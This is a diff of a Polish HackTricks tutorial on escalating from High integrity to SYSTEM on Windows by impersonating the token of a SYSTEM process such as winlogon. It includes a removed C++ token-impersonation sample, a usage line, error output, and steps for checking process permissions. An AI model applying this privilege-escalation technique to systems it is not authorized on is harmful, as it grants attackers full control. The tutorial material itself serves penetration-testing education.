@@ -1,112 +1,27 @@
+# SeImpersonate od Wysokiego do Systemu
+
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
 
 </details>
 
+### Kod
 
-## Kod
-
-Poniższy kod pochodzi [stąd](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Pozwala **wskazać identyfikator procesu jako argument** i uruchamia CMD **działające jako użytkownik** wskazanego procesu.\
-Uruchamiając w procesie o wysokiej integralności, można **wskazać PID procesu działającego jako System** (np. winlogon, wininit) i uruchomić cmd.exe jako system.
+Następujący kod pochodzi [stąd](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Pozwala **wskazać identyfikator procesu jako argument** i uruchomić CMD **działające jako użytkownik** wskazanego procesu.\
+Uruchamiając w procesie o wysokiej integralności, możesz **wskazać PID procesu działającego jako System** (np. winlogon, wininit) i uruchomić cmd.exe jako system.
 ```cpp
 impersonateuser.exe 1234
 ```
 {% code title="impersonateuser.cpp" %}
-
-```cpp
-#include <windows.h>
-
-int main()
-{
-    HANDLE hToken;
-    HANDLE hDupToken;
-    DWORD dwSessionId = 0;
-    DWORD dwProcessId = 0;
-    HANDLE hProcess;
-    HANDLE hThread;
-    LPVOID lpEnvironment;
-
-    // Get the current session ID
-    dwSessionId = WTSGetActiveConsoleSessionId();
-
-    // Get the process ID of the current process
-    dwProcessId = GetCurrentProcessId();
-
-    // Open the current process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
-
-    // Open the primary token of the current process
-    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
-    {
-        printf("OpenProcessToken failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Duplicate the primary token
-    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
-    {
-        printf("DuplicateTokenEx failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Impersonate the user associated with the primary token
-    if (!ImpersonateLoggedOnUser(hDupToken))
-    {
-        printf("ImpersonateLoggedOnUser failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Get the current thread handle
-    hThread = GetCurrentThread();
-
-    // Set the thread token to the impersonated token
-    if (!SetThreadToken(&hThread, hDupToken))
-    {
-        printf("SetThreadToken failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Load the user profile of the impersonated user
-    if (!LoadUserProfile(hDupToken, &lpEnvironment))
-    {
-        printf("LoadUserProfile failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Do something as the impersonated user
-
-    // Unload the user profile
-    if (!UnloadUserProfile(hDupToken, lpEnvironment))
-    {
-        printf("UnloadUserProfile failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Revert to the original user
-    if (!RevertToSelf())
-    {
-        printf("RevertToSelf failed: %u\n", GetLastError());
-        return 1;
-    }
-
-    // Close the handles
-    CloseHandle(hDupToken);
-    CloseHandle(hToken);
-    CloseHandle(hProcess);
-
-    return 0;
-}
-```
-{% endcode %}
 ```cpp
 // From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
 
@@ -237,11 +152,9 @@ printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
 return 0;
 }
 ```
-{% endcode %}
+### Błąd
 
-## Błąd
-
-W niektórych przypadkach próba podszywania się pod System może nie powieść się i wyświetlić wynik podobny do poniższego:
+W niektórych sytuacjach próba podszycia się pod System może nie powieść się i zwrócić wynik podobny do poniższego:
 ```cpp
 [+] OpenProcess() success!
 [+] OpenProcessToken() success!
@@ -252,22 +165,22 @@ W niektórych przypadkach próba podszywania się pod System może nie powieść
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
-To oznacza, że nawet jeśli działa się na poziomie Wysokiej Integralności, **nie ma się wystarczających uprawnień**.\
-Sprawdźmy bieżące uprawnienia Administratora dla procesów `svchost.exe` za pomocą **processes explorer** (lub można również użyć process hacker):
+To oznacza, że nawet jeśli działasz na poziomie Wysokiej Integralności **nie masz wystarczających uprawnień**.\
+Sprawdź bieżące uprawnienia Administratora dla procesów `svchost.exe` za pomocą **exploratora procesów** (lub możesz także użyć procesu hacker):
 
 1. Wybierz proces `svchost.exe`
 2. Kliknij prawym przyciskiem --> Właściwości
-3. W zakładce "Zabezpieczenia" kliknij w prawym dolnym rogu przycisk "Uprawnienia"
-4. Kliknij na "Zaawansowane"
+3. W zakładce "Bezpieczeństwo" kliknij w prawym dolnym rogu przycisk "Uprawnienia"
+4. Kliknij "Zaawansowane"
 5. Wybierz "Administratorzy" i kliknij "Edytuj"
 6. Kliknij "Pokaż zaawansowane uprawnienia"
 
-![](<../../.gitbook/assets/image (322).png>)
+![](<../../.gitbook/assets/image (434).png>)
 
-Poprzednie zdjęcie zawiera wszystkie uprawnienia, jakie "Administratorzy" mają dla wybranego procesu (jak widać w przypadku `svchost.exe`, mają tylko uprawnienia "Zapytania").
+Poprzednie zdjęcie zawiera wszystkie uprawnienia, jakie "Administratorzy" mają w wybranym procesie (jak widać w przypadku `svchost.exe`, posiadają tylko uprawnienia "Zapytanie")
 
-Zobacz uprawnienia "Administratorów" dla `winlogon.exe`:
+Sprawdź uprawnienia "Administratorów" dla `winlogon.exe`:
 
-![](<../../.gitbook/assets/image (323).png>)
+![](<../../.gitbook/assets/image (1099).png>)
 
-Wewnątrz tego procesu "Administratorzy" mogą "Odczytywać pamięć" i "Odczytywać uprawnienia", co prawdopodobnie pozwala im na podszywanie się pod token używany przez ten proces.
+Wewnątrz tego procesu "Administratorzy" mogą "Odczytywać pamięć" i "Odczytywać uprawnienia", co prawdopodobnie pozwala Administratorom na podszywanie się pod token używany przez ten proces.
